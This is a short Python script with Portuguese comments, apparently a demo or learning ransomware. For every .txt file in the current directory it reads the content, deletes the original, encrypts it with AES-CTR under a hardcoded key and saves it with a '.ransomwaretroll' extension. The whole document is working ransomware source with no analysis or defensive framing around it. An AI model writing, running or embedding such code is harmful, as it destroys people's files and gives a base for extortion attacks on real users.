import os
import pyaes

# chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# listar arquivos no diretório atual
for file_name in os.listdir():
    # verificar se o arquivo tem extensão .txt
    if file_name.endswith(".txt"):
        # abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # remover o arquivo original
        os.remove(file_name)

        # criptografar o conteúdo do arquivo
        crypto_data = aes.encrypt(file_data)

        # salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo {file_name} criptografado com sucesso!")